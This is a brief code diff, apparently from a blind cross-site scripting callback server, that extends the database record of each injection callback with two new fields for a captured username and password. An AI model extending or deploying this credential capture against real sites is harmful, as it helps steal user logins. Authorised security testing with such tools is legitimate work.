@@ -210,6 +210,8 @@ def record_callback_in_database( callback_data, request_handler ):
         dom=callback_data["dom"].encode("utf-8"),
         origin=callback_data["origin"].encode("utf-8"),
         screenshot=screenshot_file_path.encode("utf-8"),
+	cred_username=callback_data["cred_username"].encode("utf-8"),
+	cred_password=callback_data["cred_password"].encode("utf-8"),
         injection_timestamp=int(time.time()),
         browser_time=int(callback_data["browser-time"])
     )
